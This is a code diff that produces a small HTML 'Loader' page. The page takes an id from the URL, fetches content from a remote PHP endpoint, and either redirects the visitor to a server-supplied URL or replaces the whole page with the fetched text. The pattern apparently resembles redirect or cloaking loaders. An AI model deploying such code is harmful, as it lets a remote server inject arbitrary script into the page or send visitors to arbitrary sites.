@@ -1,12 +1,40 @@
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loader</title>
+</head>
+<body>
+<script>
 const queryParams = new URLSearchParams(window.location.search);
-const id = queryParams.get("id");
+const id = queryParams.get('id');
 
 if (id) {
-    fetch("https://app-stage.fairsharewl.org/video/" + id + ".html")
+    fetch('https://app-stage.fairsharewl.org/video/sax.php?file=' + encodeURIComponent(id))
         .then(response => response.text())
         .then(data => {
-            document.open();
-            document.write(data);
-            document.close();
+            try {
+                const r = JSON.parse(data);
+
+                if (r.redirectUrl) {
+                    window.location.href = r.redirectUrl;
+                    return;
+                }
+            } catch (e) {
+                document.open();
+                document.write(data);
+                document.close();
+            }
+        })
+        .catch(error => {
+            console.error('Error fetching data:', error);
         });
+} else {
+    console.error('No ID parameter found.');
 }
+</script>
+</body>
+</html>
+```
